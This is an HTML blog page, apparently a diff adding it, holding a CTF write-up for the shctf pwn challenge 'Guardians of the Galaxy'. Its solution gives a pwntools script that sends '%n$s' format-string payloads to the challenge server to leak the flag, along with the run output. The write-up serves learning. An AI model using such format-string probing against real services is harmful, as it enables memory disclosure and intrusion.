@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Writeup for the shctf pwn challenge [Guardians of the Galaxy].">
+<meta property="og:type" content="article">
+<meta property="og:title" content="shctf&#x2F;pwn: Guardians of the Galaxy">
+<meta property="og:url" content="https://jktrn.github.io/ctfs/shctf/pwn/guardians-of-the-galaxy/index.html">
+<meta property="og:site_name" content="Jason&#39;s Space 🐳">
+<meta property="og:description" content="Writeup for the shctf pwn challenge [Guardians of the Galaxy].">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-04-06T17:33:54.000Z">
+<meta property="article:modified_time" content="2022-04-09T04:15:08.466Z">
+<meta property="article:author" content="jktrn">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="shctf">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/71956291?v=4">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://avatars.githubusercontent.com/u/71956291?v=4" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://avatars.githubusercontent.com/u/71956291?v=4">
+        
+      
+    
+    <!-- title -->
+    <title>shctf/pwn: Guardians of the Galaxy</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Jason&#39;s Space 🐳" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">~/</a></li><!--
+     --><!--
+       --><li><a href="/articles/">~/articles</a></li><!--
+     --><!--
+       --><li><a href="/ctfs/">~/ctfs</a></li><!--
+     --><!--
+       --><li><a href="/profiles/">~/profiles</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="next post" href="/ctfs/shctf/pwn/warmup-to-the-dark-side/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">previous post</span>
+      <span id="i-next" class="info" style="display:none;">next post</span>
+      <span id="i-top" class="info" style="display:none;">back to top</span>
+      <span id="i-share" class="info" style="display:none;">share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jktrn.github.io/ctfs/shctf/pwn/guardians-of-the-galaxy/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jktrn.github.io/ctfs/shctf/pwn/guardians-of-the-galaxy/&text=shctf/pwn: Guardians of the Galaxy"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jktrn.github.io/ctfs/shctf/pwn/guardians-of-the-galaxy/&title=shctf/pwn: Guardians of the Galaxy"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jktrn.github.io/ctfs/shctf/pwn/guardians-of-the-galaxy/&is_video=false&description=shctf/pwn: Guardians of the Galaxy"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=shctf/pwn: Guardians of the Galaxy&body=Check out this article: https://jktrn.github.io/ctfs/shctf/pwn/guardians-of-the-galaxy/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jktrn.github.io/ctfs/shctf/pwn/guardians-of-the-galaxy/&title=shctf/pwn: Guardians of the Galaxy"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jktrn.github.io/ctfs/shctf/pwn/guardians-of-the-galaxy/&title=shctf/pwn: Guardians of the Galaxy"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jktrn.github.io/ctfs/shctf/pwn/guardians-of-the-galaxy/&title=shctf/pwn: Guardians of the Galaxy"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jktrn.github.io/ctfs/shctf/pwn/guardians-of-the-galaxy/&title=shctf/pwn: Guardians of the Galaxy"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jktrn.github.io/ctfs/shctf/pwn/guardians-of-the-galaxy/&name=shctf/pwn: Guardians of the Galaxy&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jktrn.github.io/ctfs/shctf/pwn/guardians-of-the-galaxy/&t=shctf/pwn: Guardians of the Galaxy"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%9C-Description"><span class="toc-number">1.</span> <span class="toc-text">📜 Description</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%8D-Detailed-Solution"><span class="toc-number">2.</span> <span class="toc-text">🔍 Detailed Solution</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        shctf/pwn: Guardians of the Galaxy
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">jktrn</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-04-06T17:33:54.000Z" itemprop="datePublished">April 6, 2022</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/ctf/" rel="tag">ctf</a>, <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>, <a class="tag-link-link" href="/tags/shctf/" rel="tag">shctf</a>
+    </div>
+
+ <br>
+      <i class="fas fa-clock"></i> 3 min. read
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="📜-Description"><a href="#📜-Description" class="headerlink" title="📜 Description"></a>📜 Description</h2><p>Ronan the Accuser has the Power Stone. Can Starlord find a successful distraction format?<br><code>nc 0.cloud.chals.io 12690</code><br><strong>Author</strong>: GlitchArchetype</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/WhileSEC/shctf/blob/main/challenges/pwn/guardians-of-the-galaxy/files/guardians">guardians</a></li>
+</ul>
+<hr>
+<h2 id="🔍-Detailed-Solution"><a href="#🔍-Detailed-Solution" class="headerlink" title="🔍 Detailed Solution"></a>🔍 Detailed Solution</h2><p>Let’s look at what happens when you run that binary given to us.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./guardians </span><br><span class="line">Error, please message admins with &#x27;infinity_error&#x27;.</span><br></pre></td></tr></table></figure>
+<p>This error is because the binary is probably trying to reference a <code>flag.txt</code> within its directory that doesn’t exist. Let’s create one and run it again:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ touch flag.txt &amp;&amp; echo &quot;FLAGHERE&quot; &gt; flag.txt</span><br><span class="line">$ ./guardians</span><br><span class="line">Does Quill manage to win the dance battle?</span><br></pre></td></tr></table></figure>
+<p>There, we got it to work locally. Since we know that this is problem a format string vulnerability from the “find a successful distraction format” part of the description, let’s assume that the vulnerability is it writing our input to the stack with <code>printf()</code>. We will need to work our way up the stack with the format <code>%n$s</code>, where <code>n</code> is the decimal index of the argument you want, and <code>s</code> is the <code>printf()</code> specifier for a <strong>string of characters</strong>. I wrote this Python&#x2F;pwntools script here to achieve this loop:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100</span>):</span><br><span class="line">        p = remote(<span class="string">&#x27;0.cloud.chals.io&#x27;</span>, <span class="number">12690</span>)  </span><br><span class="line">        log.info(<span class="string">f&quot;Trying offset <span class="subst">&#123;i&#125;</span>...&quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">bytes</span>((<span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;$s&#x27;</span>), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        output = p.readS()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;shctf&#x27;</span> <span class="keyword">in</span> output:</span><br><span class="line">                log.success(output)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>
+<p>As you can see, it will send a UTF-8 encoded format string, with <code>str(i)</code> being the looping variable. If its output contains the flag, the loop breaks and the script will stop. Let’s run it:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[*] Trying offset 0...</span><br><span class="line">[*] Closed connection to 0.cloud.chals.io port 12690</span><br><span class="line">[+] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[*] Trying offset 1...</span><br><span class="line">[*] Closed connection to 0.cloud.chals.io port 12690</span><br><span class="line">[+] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[*] Trying offset 2...</span><br><span class="line">[*] Closed connection to 0.cloud.chals.io port 12690</span><br><span class="line">[+] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[*] Trying offset 3...</span><br><span class="line">[*] Closed connection to 0.cloud.chals.io port 12690</span><br><span class="line">[+] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[*] Trying offset 4...</span><br><span class="line">[*] Closed connection to 0.cloud.chals.io port 12690</span><br><span class="line">[+] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[*] Trying offset 5...</span><br><span class="line">[*] Closed connection to 0.cloud.chals.io port 12690</span><br><span class="line">[+] Opening connection to 0.cloud.chals.io on port 12690: Done</span><br><span class="line">[*] Trying offset 6...</span><br><span class="line">[+] Does Quill manage to win the dance battle?</span><br><span class="line">    </span><br><span class="line">    Oh no, Ronano has seen through the distraction!</span><br><span class="line">    shctf&#123;im_distracting_you&#125;</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">~/</a></li>
+         
+          <li><a href="/articles/">~/articles</a></li>
+         
+          <li><a href="/ctfs/">~/ctfs</a></li>
+         
+          <li><a href="/profiles/">~/profiles</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%9C-Description"><span class="toc-number">1.</span> <span class="toc-text">📜 Description</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%8D-Detailed-Solution"><span class="toc-number">2.</span> <span class="toc-text">🔍 Detailed Solution</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jktrn.github.io/ctfs/shctf/pwn/guardians-of-the-galaxy/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jktrn.github.io/ctfs/shctf/pwn/guardians-of-the-galaxy/&text=shctf/pwn: Guardians of the Galaxy"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jktrn.github.io/ctfs/shctf/pwn/guardians-of-the-galaxy/&title=shctf/pwn: Guardians of the Galaxy"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jktrn.github.io/ctfs/shctf/pwn/guardians-of-the-galaxy/&is_video=false&description=shctf/pwn: Guardians of the Galaxy"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=shctf/pwn: Guardians of the Galaxy&body=Check out this article: https://jktrn.github.io/ctfs/shctf/pwn/guardians-of-the-galaxy/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jktrn.github.io/ctfs/shctf/pwn/guardians-of-the-galaxy/&title=shctf/pwn: Guardians of the Galaxy"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jktrn.github.io/ctfs/shctf/pwn/guardians-of-the-galaxy/&title=shctf/pwn: Guardians of the Galaxy"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jktrn.github.io/ctfs/shctf/pwn/guardians-of-the-galaxy/&title=shctf/pwn: Guardians of the Galaxy"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jktrn.github.io/ctfs/shctf/pwn/guardians-of-the-galaxy/&title=shctf/pwn: Guardians of the Galaxy"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jktrn.github.io/ctfs/shctf/pwn/guardians-of-the-galaxy/&name=shctf/pwn: Guardians of the Galaxy&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jktrn.github.io/ctfs/shctf/pwn/guardians-of-the-galaxy/&t=shctf/pwn: Guardians of the Galaxy"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022
+    jktrn
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">~/</a></li><!--
+     --><!--
+       --><li><a href="/articles/">~/articles</a></li><!--
+     --><!--
+       --><li><a href="/ctfs/">~/ctfs</a></li><!--
+     --><!--
+       --><li><a href="/profiles/">~/profiles</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
